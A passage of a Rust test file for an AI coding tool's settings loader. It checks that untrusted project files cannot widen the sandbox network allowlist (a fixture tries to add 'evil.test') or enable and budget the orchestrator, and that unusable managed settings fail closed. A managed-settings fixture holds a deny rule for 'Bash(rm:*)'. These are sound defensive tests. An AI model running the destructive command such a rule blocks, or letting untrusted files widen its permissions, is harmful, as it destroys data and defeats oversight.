        fs::read_to_string(&other).unwrap(),
        "precious\n",
        "written through the hard link"
    );
    let gi = fs::read_to_string(dir.join(".gitignore")).unwrap();
    assert!(
        gi.contains("precious") && gi.contains("settings.local.json"),
        "{gi}"
    );
    assert!(leftovers(&dir).is_empty());
}

#[test]
fn old_synthesis_key_is_reported_and_not_honoured() {
    let f = fx();
    f.user(json!({"synthesis":{"budget":{"max_turns":1}}}));
    let s = f.load(ProjectTrust::Trusted);
    assert!(
        s.diagnostics
            .iter()
            .any(|d| d.contains("key \"synthesis\" was renamed to \"synt\"")),
        "{:?}",
        s.diagnostics
    );
    assert_eq!(s.synthesis.budget.max_turns, None);
}

#[test]
fn wsl_hide_windows_drives_is_user_or_managed_only() {
    let f = fx();
    f.user(json!({"synt":{"sandbox":{"wsl":{"hide_windows_drives":false}}}}));
    f.project(json!({"synt":{"sandbox":{"wsl":{"hide_windows_drives":true}}}}));
    let s = f.load(ProjectTrust::Trusted);
    assert_eq!(s.synthesis.wsl_hide_windows_drives, Some(false));
    assert!(
        s.diagnostics
            .iter()
            .any(|d| d.contains("project settings: synt.sandbox.wsl is read from user or managed"))
    );
    let f = fx();
    f.project(json!({"synt":{"sandbox":{"wsl":{"hide_windows_drives":false}}}}));
    assert_eq!(
        f.load(ProjectTrust::Trusted)
            .synthesis
            .wsl_hide_windows_drives,
        None
    );
    let f = fx();
    f.user(json!({"synt":{"sandbox":{"wsl":{"hide_windows_drives":"no"}}}}));
    let s = f.load(ProjectTrust::Trusted);
    assert_eq!(s.synthesis.wsl_hide_windows_drives, None);
    assert!(
        s.diagnostics
            .iter()
            .any(|d| d.contains("must be true or false"))
    );
}

#[test]
fn model_info_fetch_is_a_user_setting_only() {
    let f = fx();
    f.user(json!({"synt":{"modelInfo":{"fetch":false}}}));
    f.project(json!({"synt":{"modelInfo":{"fetch":true}}}));
    let s = f.load(ProjectTrust::Trusted);
    assert_eq!(s.synthesis.model_info_fetch, Some(false));
    assert!(
        s.diagnostics
            .iter()
            .any(|d| d.contains("project settings: synt.modelInfo is read from user settings only"))
    );
    let f = fx();
    f.project(json!({"synt":{"modelInfo":{"fetch":false}}}));
    assert_eq!(
        f.load(ProjectTrust::Trusted).synthesis.model_info_fetch,
        None
    );
    let f = fx();
    f.user(json!({"synt":{"modelInfo":{"fetch":"no"}}}));
    let s = f.load(ProjectTrust::Trusted);
    assert_eq!(s.synthesis.model_info_fetch, None);
    assert!(
        s.diagnostics
            .iter()
            .any(|d| d.contains("modelInfo.fetch must be"))
    );
}

#[test]
fn synt_cli_and_synt_tui_are_separate_sections_of_the_user_file() {
    let f = fx();
    let home = f.home.path();
    let t = UiSettings {
        verbose: true,
        ..UiSettings::default()
    };
    persist_user_ui(home, CLI_SECTION, &t).unwrap();
    assert_eq!(read_user_ui(home, CLI_SECTION), (t, vec![]));
    // the desktop TUI tab's section is untouched
    assert_eq!(read_user_ui(home, TUI_SECTION).0, UiSettings::default());
    let v: serde_json::Value =
        serde_json::from_slice(&fs::read(home.join("settings.json")).unwrap()).unwrap();
    assert!(v["synt"].get("tui").is_none() && v["synt"]["cli"]["verbose"] == true);
    let (_, d) = UiSettings::from_section(&json!({"synt": {"cli": {"motion": 1}}}), CLI_SECTION);
    assert!(d[0].contains("synt.cli.motion"), "{d:?}");
}

#[test]
fn network_allowed_hosts_is_user_or_managed_only_and_managed_wins() {
    let f = fx();
    f.user(json!({"synt":{"sandbox":{"network":{"allowedHosts":["a.test"]}}}}));
    f.project(json!({"synt":{"sandbox":{"network":{"allowedHosts":["evil.test"]}}}}));
    let s = f.load(ProjectTrust::Trusted);
    assert_eq!(
        s.synthesis.network_allowed_hosts,
        Some(vec!["a.test".into()])
    );
    assert!(!s.synthesis.network_allowed_hosts_managed);
    assert!(s.diagnostics.iter().any(|d| {
        d.contains("project settings: synt.sandbox.network is read from user or managed")
    }));
    let f = fx();
    f.project(json!({"synt":{"sandbox":{"network":{"allowedHosts":["evil.test"]}}}}));
    assert_eq!(
        f.load(ProjectTrust::Trusted)
            .synthesis
            .network_allowed_hosts,
        None
    );
    let f = fx();
    f.user(json!({"synt":{"sandbox":{"network":{"allowedHosts":["a.test"]}}}}));
    write(
        f.home.path(),
        "managed.json",
        json!({"synt":{"sandbox":{"network":{"allowedHosts":["corp.test"]}}}}),
    );
    let s = f.load(ProjectTrust::Trusted);
    assert_eq!(
        s.synthesis.network_allowed_hosts,
        Some(vec!["corp.test".into()])
    );
    assert!(s.synthesis.network_allowed_hosts_managed);
    let f = fx();
    f.user(json!({"synt":{"sandbox":{"network":{"allowedHosts":"a.test"}}}}));
    let s = f.load(ProjectTrust::Trusted);
    assert_eq!(s.synthesis.network_allowed_hosts, None);
    assert!(s.diagnostics.iter().any(|d| d.contains("list of strings")));
}

#[test]
fn orchestrator_is_off_by_default_with_the_plan_defaults() {
    let f = fx();
    let o = f.load(ProjectTrust::Trusted).synthesis.orchestrator;
    assert_eq!(o, OrchestratorSettings::default());
    assert!(!o.enabled);
    assert_eq!(
        (o.max_parallel_workers, o.max_attempts_per_work_item),
        (2, 3)
    );
    assert_eq!(o.max_cost_usd, None, "the cost cap has no default");
    assert_eq!(
        (
            o.worktree_retention_days,
            o.decision_expiry_hours,
            o.idle_exit_minutes
        ),
        (7, 24, 10)
    );
}

#[test]
fn orchestrator_reads_the_user_file_and_validates_every_key() {
    let f = fx();
    f.user(json!({"synt":{"orchestrator":{
        "enabled": true, "max_parallel_workers": 4, "max_attempts_per_work_item": 2,
        "max_cost_usd": 12.5, "attempt": {"max_cost_usd": 1.5, "max_wall_secs": 600},
        "worktree_retention_days": 3, "decision_expiry_hours": 48, "idle_exit_minutes": 5
    }}}));
    let s = f.load(ProjectTrust::Trusted);
    let o = &s.synthesis.orchestrator;
    assert!(o.enabled);
    assert_eq!(
        (o.max_parallel_workers, o.max_attempts_per_work_item),
        (4, 2)
    );
    assert_eq!(
        (
            o.max_cost_usd,
            o.attempt_max_cost_usd,
            o.attempt_max_wall_secs
        ),
        (Some(12.5), Some(1.5), Some(600))
    );
    assert_eq!(
        (
            o.worktree_retention_days,
            o.decision_expiry_hours,
            o.idle_exit_minutes
        ),
        (3, 48, 5)
    );
    assert!(s.diagnostics.is_empty(), "{:?}", s.diagnostics);

    // wrong values keep the previous value and are named without their value
    let f = fx();
    f.user(json!({"synt":{"orchestrator":{
        "enabled": "yes", "max_parallel_workers": 0, "max_attempts_per_work_item": 11,
        "max_cost_usd": -1, "attempt": {"max_cost_usd": "x", "max_wall_secs": 0, "nope": 1},
        "worktree_retention_days": 0, "decision_expiry_hours": 721, "idle_exit_minutes": 1.5,
        "bogus": 1, "network": {"allowed_hosts": ["x.test"]}
    }}}));
    let s = f.load(ProjectTrust::Trusted);
    assert_eq!(s.synthesis.orchestrator, OrchestratorSettings::default());
    let d = s.diagnostics.join("\n");
    for k in [
        "enabled",
        "max_parallel_workers",
        "max_attempts_per_work_item",
        "max_cost_usd",
        "attempt.max_cost_usd",
        "attempt.max_wall_secs",
        "attempt.nope",
        "worktree_retention_days",
        "decision_expiry_hours",
        "idle_exit_minutes",
        "bogus",
        "network",
    ] {
        assert!(d.contains(&format!("synt.orchestrator.{k}")), "{k}: {d}");
    }
    assert!(
        !d.contains("x.test") && !d.contains("721"),
        "values stay out of diagnostics"
    );

    let f = fx();
    f.user(json!({"synt":{"orchestrator":[true]}}));
    assert!(
        f.load(ProjectTrust::Trusted)
            .diagnostics
            .iter()
            .any(|d| d.contains("not an object"))
    );
    let f = fx();
    f.user(json!({"synt":{"orchestrator":{"max_cost_usd": f64::MAX}}}));
    assert_eq!(
        f.load(ProjectTrust::Trusted)
            .synthesis
            .orchestrator
            .max_cost_usd,
        Some(f64::MAX)
    );
}

#[test]
fn a_project_or_local_file_can_never_enable_or_budget_the_orchestrator() {
    for trust in [ProjectTrust::Trusted, ProjectTrust::Untrusted] {
        let f = fx();
        f.project(json!({"synt":{"orchestrator":{"enabled": true, "max_cost_usd": 1000}}}));
        write(
            f.proj.path(),
            ".synt/settings.local.json",
            json!({"synt":{"orchestrator":{"enabled": true}}}),
        );
        let s = f.load(trust);
        assert_eq!(
            s.synthesis.orchestrator,
            OrchestratorSettings::default(),
            "{trust:?}"
        );
        assert!(!s.synthesis.orchestrator.enabled);
        assert!(
            s.diagnostics.iter().any(|d| d.contains("ignored")),
            "{trust:?}: {:?}",
            s.diagnostics
        );
    }
    let f = fx();
    f.project(json!({"synt":{"orchestrator":{"enabled": true}}}));
    let s = f.load(ProjectTrust::Trusted);
    assert!(s.diagnostics.iter().any(|d| {
        d.contains("project settings: synt.orchestrator is read from user or managed settings only")
    }));
}

#[test]
fn managed_orchestrator_settings_win_over_the_user_in_both_directions() {
    // the organisation forbids it
    let f = fx();
    f.user(json!({"synt":{"orchestrator":{"enabled": true, "max_cost_usd": 100, "max_parallel_workers": 8}}}));
    write(
        f.home.path(),
        "managed.json",
        json!({"synt":{"orchestrator":{"enabled": false, "max_cost_usd": 10}}}),
    );
    let o = f.load(ProjectTrust::Trusted).synthesis.orchestrator;
    assert!(!o.enabled, "managed off beats user on");
    assert_eq!(o.max_cost_usd, Some(10.0));
    assert_eq!(
        o.max_parallel_workers, 8,
        "a key managed does not state stays the user's"
    );
    // the organisation requires it
    let f = fx();
    f.user(json!({"synt":{"orchestrator":{"enabled": false}}}));
    write(
        f.home.path(),
        "managed.json",
        json!({"synt":{"orchestrator":{"enabled": true}}}),
    );
    assert!(f.load(ProjectTrust::Trusted).synthesis.orchestrator.enabled);
}

#[test]
fn orchestrator_keys_under_a_surface_section_are_not_read() {
    let f = fx();
    f.user(
        json!({"synt":{"cli":{"orchestrator":{"enabled": true}, "max_cost_usd": 5},
                          "tui":{"enabled": true}}}),
    );
    let s = f.load(ProjectTrust::Trusted);
    assert!(!s.synthesis.orchestrator.enabled);
    let (_, d) = UiSettings::from_section(
        &json!({"synt":{"cli":{"orchestrator":{"enabled":true}}}}),
        CLI_SECTION,
    );
    assert!(
        d.iter().any(|d| d.contains("synt.cli.orchestrator")),
        "{d:?}"
    );
}

/// F11: a value the managed file states wrongly must not leave the user's looser one in force.
#[test]
fn an_unusable_managed_orchestrator_value_fails_closed() {
    for bad in [
        json!({"enabled": "yes"}),
        json!({"enabled": true, "max_cost_usd": "ten"}),
        json!({"max_parallel_workers": 0}),
        json!({"attempt": {"max_wall_secs": -1}}),
    ] {
        let f = fx();
        f.user(json!({"synt":{"orchestrator":{"enabled": true, "max_cost_usd": 1000, "max_parallel_workers": 8}}}));
        write(
            f.home.path(),
            "managed.json",
            json!({"synt":{"orchestrator": bad}}),
        );
        let s = f.load(ProjectTrust::Trusted);
        let o = &s.synthesis.orchestrator;
        assert!(
            !o.enabled && o.fail_closed,
            "{bad}: the user's `enabled` must not survive"
        );
        assert!(
            s.diagnostics.iter().any(|d| d.contains("switched off")),
            "{:?}",
            s.diagnostics
        );
    }
    let f = fx();
    f.user(json!({"synt":{"orchestrator":{"enabled": true}}}));
    write(
        f.home.path(),
        "managed.json",
        json!({"synt":{"orchestrator": [1]}}),
    );
    assert!(!f.load(ProjectTrust::Trusted).synthesis.orchestrator.enabled);
    // a bad user value only keeps the previous value (no lockout from the user's own typo)
    let f = fx();
    f.user(json!({"synt":{"orchestrator":{"enabled": "yes"}}}));
    let o = f.load(ProjectTrust::Trusted).synthesis.orchestrator;
    assert!(!o.enabled && !o.fail_closed);
    // a good managed object does not lock anything
    let f = fx();
    f.user(json!({"synt":{"orchestrator":{"enabled": true}}}));
    write(
        f.home.path(),
        "managed.json",
        json!({"synt":{"orchestrator":{"max_cost_usd": 10}}}),
    );
    let o = f.load(ProjectTrust::Trusted).synthesis.orchestrator;
    assert!(o.enabled && !o.fail_closed && o.max_cost_usd == Some(10.0));
}

/// N5: whatever makes the managed file unusable switches the feature off.
#[test]
fn a_managed_file_that_cannot_be_used_fails_closed() {
    let user = json!({"synt":{"orchestrator":{"enabled": true, "max_cost_usd": 1000}}});
    let managed_raw: [(&str, String); 5] = [
        ("malformed json", "{not json".into()),
        ("not an object", "[1,2]".into()),
        (
            "unknown key in the block",
            json!({"synt":{"orchestrator":{"max_cost_usd": 5, "max_cost": 1}}}).to_string(),
        ),
        ("synt is not an object", json!({"synt": "x"}).to_string()),
        (
            "synt from a newer build",
            json!({"synt":{"version": 99}}).to_string(),
        ),
    ];
    for (what, raw) in managed_raw {
        let f = fx();
        f.user(user.clone());
        fs::write(f.home.path().join("managed.json"), raw).unwrap();
        let s = f.load(ProjectTrust::Trusted);
        let o = &s.synthesis.orchestrator;
        assert!(!o.enabled && o.fail_closed, "{what}: {:?}", s.diagnostics);
        assert!(
            s.diagnostics.iter().any(|d| d.contains("switched off")),
            "{what}: {:?}",
            s.diagnostics
        );
    }
    // a managed file that simply does not mention the feature locks nothing
    let f = fx();
    f.user(user);
    write(
        f.home.path(),
        "managed.json",
        json!({"permissions": {"deny": ["Bash(rm:*)"]}}),
    );
    let o = f.load(ProjectTrust::Trusted).synthesis.orchestrator;
    assert!(o.enabled && !o.fail_closed);
    // and no managed file at all is the user's call
    let f = fx();
    f.user(json!({"synt":{"orchestrator":{"enabled": true}}}));
    assert!(f.load(ProjectTrust::Trusted).synthesis.orchestrator.enabled);
}
